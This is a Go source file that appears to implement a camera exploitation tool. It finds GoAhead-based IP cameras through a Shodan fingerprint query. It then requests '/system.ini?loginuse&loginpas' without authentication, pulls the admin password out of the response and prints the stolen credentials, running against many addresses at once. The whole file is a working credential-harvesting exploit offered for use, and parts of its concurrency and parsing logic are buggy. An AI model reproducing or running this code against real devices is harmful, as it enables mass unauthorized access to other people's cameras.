package pkg

import (
	"context"
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"regexp"
	"strings"
	"sync"

	"github.com/ns3777k/go-shodan/v4/shodan"
)

type CamOver struct {
	username string
}

type CamOverCli struct {
	CamOver     CamOver
	threadDelay float64
}

type CamAccount struct {
	username string
	password string
}

func (c *CamOver) Exploit(address string) (*CamAccount, bool, error) {
	c.username = "admin"

	transport := http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: false,
		},
	}

	client := &http.Client{
		Transport: &transport,
	}

	target := fmt.Sprintf("http://%s/system.ini?loginuse&loginpas", address)

	request, err := http.NewRequest(http.MethodGet, target, nil)
	if err != nil {
		return nil, false, err
	}

	resp, err := client.Do(request)

	if err != nil {
		return nil, false, err
	}

	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		account := &CamAccount{}

		re := regexp.MustCompile(`[^\x00-\x1F\x7F-\xFF]{4,}`)

		content, _ := ioutil.ReadAll(resp.Body)

		patternString := re.FindAllSubmatch([]byte(content), -1)

		for index, val := range patternString {
			if strings.Contains(string(val[index]), c.username) {
				account.username = "admin"
				userIndex := strings.Index(string(val[index]), account.username)
				account.password = string(val[userIndex+1])

				return account, true, nil
			} else {
				continue
			}
		}
	}

	return nil, false, err
}

func (c *CamOverCli) thread(address, output string) bool {
	account, ok, err := c.CamOver.Exploit(address)
	if err != nil {
		return false
	}

	if ok {
		if output == "" {
			Success(fmt.Sprintf("username :: %s - password :: %s", account.username, account.password))
			return true
		} else {
			Success(fmt.Sprintf("username :: %s - password :: %s", account.username, account.password))
			return true
		}
	}

	return false
}

func (c *CamOverCli) GetAddresesFromShodan(token string) []string {
	var mathces []string

	client := shodan.NewClient(&http.Client{}, token)
	resp, err := client.SearchQueries(context.Background(), &shodan.SearchQueryOptions{
		Query: "GoAhead 5ccc069c403ebaf9f0171e9517f40e41",
	})

	if err != nil {
		return []string{}
	}

	for _, matche := range resp.Matches {
		r := matche.Query
		mathces = append(mathces, r)
	}

	return mathces
}

func (c *CamOverCli) write2file(outputfile string) {}

func (c *CamOverCli) crack(addresses []string, outputfile string) {
	var wg sync.WaitGroup

	for _, address := range addresses {
		wg.Add(3)
		defer wg.Done()

		go func(address string) {
			ok := c.thread(address, outputfile)
			if ok {
				Process("Found address : " + address)
			} else {
				Errorf("Not Found target !")
			}
		}(address)
	}

	wg.Wait()
}
